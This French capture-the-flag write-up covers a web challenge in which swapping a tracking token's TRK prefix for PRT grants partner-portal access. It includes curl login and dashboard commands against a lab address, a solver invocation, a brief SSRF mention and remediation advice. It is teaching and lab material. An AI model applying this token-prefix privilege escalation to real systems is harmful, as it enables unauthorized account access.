# INTERNAL DISPATCH

[Accueil](../../README.md) · [Web](../README.md) · [Index](../../INDEX.md)

## Informations générales

| Champ | Valeur |
|---|---|
| Nom | INTERNAL DISPATCH |
| Compétition | HackerLab Bénin 2026 |
| Catégorie de classement | Web |
| Difficulté | Non documentée |
| Points | Non documentés |
| Auteur | Non documenté |
| Statut | **Partial** |
| Technologies | HTTP, codes partenaires, SSRF, JSON |
| Validation | Aucune validation plateforme exportée |

## 1. Introduction

Obtenir la session partenaire correspondant au reçu.

Cette édition reconstruit les travaux conservés. Les commandes citées sont historiques, sauf mention explicite d’un contrôle documentaire local. Aucune cible n’a été contactée lors de la rédaction. Les paramètres d’accès et les réponses sont expurgés ; les remplacer depuis les artefacts autorisés pour une reproduction en laboratoire.

## 2. Énoncé du challenge

- Q2 — Objectif reconstitué de la note ; énoncé intégral de la carte absent.

### Objectif

Source : [writeup-INTERNAL-DISPATCH.md](evidence/web-depart-writeup-internal-dispatch-md.txt)

Accéder à l'espace partenaire interne et récupérer l'identifiant de session
affiché sur le tableau de bord.

## 3. Analyse initiale

1 fichiers rattachés directement à ce dossier. Voir l’[inventaire des pièces](evidence/manifest.md), qui indique leur chemin d’origine, leur taille et la décision de publication. Les pièces partagées sont référencées dans les questions apparentées, sans recopier les archives.

### État initial

Source : [writeup-INTERNAL-DISPATCH.md](evidence/web-depart-writeup-internal-dispatch-md.txt)

- Cible : `http://172.28.38.2:8080`
- Reçu `recu_northline.png` avec un QR vers `/track/TRK.<id>.<integrite>`.
- `/login` refuse `TRK` mais accepte `PRT`.

## 4. Reconnaissance et investigation

### Reconnaissance

Source : [writeup-INTERNAL-DISPATCH.md](evidence/web-depart-writeup-internal-dispatch-md.txt)

1. Extraction du code de suivi :

   ```bash
   zbarimg --raw -q recu_northline.png
   ```

2. Tentative de connexion avec le code tel quel :

   ```bash
   curl -i -X POST http://172.28.38.2:8080/login \
        -d 'code=TRK.<id>.<integrite>'
   # -> message « invalide ou expiré »
   ```

3. Substitution du préfixe `TRK` → `PRT` en conservant identifiant et
   intégrité :

   ```bash
   curl -i -X POST http://172.28.38.2:8080/login \
        -d 'code=PRT.<id>.<integrite>'
   # -> 302 /dashboard
   ```

## 5. Identification du mécanisme

Le segment d’intégrité n’est pas lié au préfixe TRK/PRT. Après accès au portail partenaire, l’import de bordereau permet une lecture du service local via une adresse IPv4 numérique. Les questions suivantes utilisent les relations expédition → opération → affectation ; seule l’affectation active est pertinente.

### Interprétation

Source : [writeup-INTERNAL-DISPATCH.md](evidence/web-depart-writeup-internal-dispatch-md.txt)

Le jeton de suivi public et le jeton partenaire partagent le même identifiant
et la même intégrité ; seul le préfixe change le contexte d'autorisation.
L'intégrité n'authentifie donc pas le préfixe, ce qui permet une élévation de
contexte.

Après connexion, `/dashboard` affiche :

- le compte partenaire **Skarvik Marine Services** (`partner-1042`) ;
- une carte `flag-card` contenant l'identifiant de session attendu.

## 6. Exploitation ou résolution

### Exploitation

Source : [writeup-INTERNAL-DISPATCH.md](evidence/web-depart-writeup-internal-dispatch-md.txt)

```bash
# 1. connexion
curl -s -c cj -X POST http://172.28.38.2:8080/login \
     -d 'code=PRT.<id>.<integrite>'

# 2. lecture du tableau de bord
curl -s -b cj http://172.28.38.2:8080/dashboard \
  | grep -o '<section class="flag-card">.*</section>'
```

La carte contient l'identifiant de session (valeur volontairement masquée ici).

### Validation reproductible (sans la réponse)

Source : [writeup-INTERNAL-DISPATCH.md](evidence/web-depart-writeup-internal-dispatch-md.txt)

```bash
python3 solveur.py --target http://172.28.38.2:8080 \
  --code PRT.<id>.<integrite> --q2
```

Sortie attendue :

```
[+] POST /login -> 302
[+] session partenaire : Skarvik Marine Services
[+] FLAG q:2 : <identifiant de session>
```

La valeur affichée doit correspondre à celle de la carte `flag-card` de
`/dashboard`.

## 7. Scripts et automatisation

Aucun script autonome rattaché directement à cette question. Les commandes intégrées aux notes sont reproduites lorsqu’elles existent ; elles ne sont pas déclarées testées dans cette édition.

Les outils partagés sont inventoriés dans [THE GATE](../the-gate/README.md). Les arguments spécifiques à cette question sont ceux des notes historiques.

## 8. Questions et flags

Les réponses ne sont pas publiées, conformément à la règle locale de non-divulgation. Un signalement au hub ne vaut pas acceptation par la compétition.

| Question / objectif | Méthode et preuve | Réponse | Validation |
|---|---|---|---|
| Q2 — Objectif reconstitué de la note ; énoncé intégral de la carte absent. | Voir la reconstruction et les sources de ce dossier. | Non reproduite / inconnue si non résolue | Aucune validation plateforme exportée |

## 9. Difficultés rencontrées

### Chemins qui ont échoué

Source : [writeup-INTERNAL-DISPATCH.md](evidence/web-depart-writeup-internal-dispatch-md.txt)

- **Préfixe `TRK` en login** : rejeté.
- **Autres préfixes** (`PUB`, `OPS`, etc.) : « invalide ou expiré ».
- **Accès direct à `/dashboard` sans session** : redirection vers `/login`.

## 10. Analyse technique approfondie

Le segment d’intégrité n’est pas lié au préfixe TRK/PRT. Après accès au portail partenaire, l’import de bordereau permet une lecture du service local via une adresse IPv4 numérique. Les questions suivantes utilisent les relations expédition → opération → affectation ; seule l’affectation active est pertinente. Les critères de validation doivent porter sur les données produites, pas seulement sur l’absence d’erreur d’un outil.

## 11. Remédiations

Lier cryptographiquement le type de code à son identifiant ; appliquer une autorisation par opération et affectation. Normaliser et contrôler les adresses résolues avant toute requête serveur et isoler les services internes.

## 12. Conclusion

Obtenir la session partenaire correspondant au reçu. La documentation disponible permet une reconstruction détaillée. Statut retenu : Partial. Aucune validation plateforme exportée.

### Leçons

Source : [writeup-INTERNAL-DISPATCH.md](evidence/web-depart-writeup-internal-dispatch-md.txt)

- Un identifiant signé sans liaison au préfixe/contexte autorise un changement
  de rôle.
- Toujours tester les variantes de préfixe d'un jeton avant de conclure qu'il
  est invalide.

## 13. Références

Les références sont les pièces locales ci-dessous. Les références Internet citées dans les notes restent historiques et n’ont pas été consultées pendant cette mission.

- [writeup-INTERNAL-DISPATCH.md](evidence/web-depart-writeup-internal-dispatch-md.txt) — origine : `web/depart/writeup-INTERNAL-DISPATCH.md`.

- [Inventaire local des pièces](evidence/manifest.md).
- [Retour à l’index](../../INDEX.md).

